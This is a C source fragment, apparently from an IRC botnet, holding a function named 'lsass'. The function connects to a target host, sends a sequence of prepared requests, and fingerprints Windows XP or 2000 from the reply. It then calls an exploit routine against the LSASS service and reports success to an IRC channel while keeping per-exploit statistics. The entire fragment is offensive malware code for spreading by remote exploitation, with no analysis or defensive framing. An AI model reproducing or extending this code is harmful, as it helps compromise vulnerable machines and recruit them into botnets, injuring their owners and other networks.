BOOL lsass(EXINFO exinfo)
  {

	    int len;
		char buffer[IRCLINE];
		SOCKET sockfd;
 		int dport = brandom(1900, 48000);
		BOOL success = FALSE;
        char recvbuf[1600];
		SOCKADDR_IN their_addr;
		memset(&their_addr, 0, sizeof(their_addr));

		{

			their_addr.sin_family = AF_INET;
			their_addr.sin_addr.s_addr = finet_addr(exinfo.ip); // = *((LPIN_ADDR) * lpHostEntry->h_addr_list);

			/* ^ Server's address */
			their_addr.sin_port = fhtons((unsigned short)exinfo.port);

			/* connect to the server */

      if ((sockfd = fsocket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == INVALID_SOCKET)
        return FALSE;
      if (fconnect(sockfd, (LPSOCKADDR)&their_addr, sizeof(their_addr)) == SOCKET_ERROR)
        return FALSE;
      if (fsend(sockfd, req1, sizeof(req1)-1, 0) == -1)
        return FALSE;
      len = frecv(sockfd, recvbuf, 1600, 0);

      if (fsend(sockfd, req2, sizeof(req2)-1, 0) == -1)
        return FALSE;
      len = frecv(sockfd, recvbuf, 1600, 0);

      if (fsend(sockfd, req3, sizeof(req3)-1, 0) == -1)
        return FALSE;
      len = frecv(sockfd, recvbuf, 1600, 0);


       switch (recvbuf[68]) {

         case '1': // win XP
			if (Exploit2( exinfo, sockfd, 0 ))
				success = TRUE;
			break;

         case '0': //win 2k
			 if (!Exploit2( exinfo, sockfd, 2 )) {
				if (Exploit2( exinfo, sockfd, 1))
					success = TRUE;
			 } else {
				 success = TRUE; }
            break;

         default:
           return FALSE;
       }
    }
    fclosesocket(sockfd);
	if (success) {
		_snprintf(buffer, sizeof(buffer), "Trying Exploit: %s (%s)", exinfo.ip, exploit[exinfo.exploit].name);
		irc_privmsg(exinfo.sock, exinfo.chan, buffer, exinfo.notice);
		addlog(buffer);
		exploit[exinfo.exploit].stats++;
	}
	return TRUE;

  }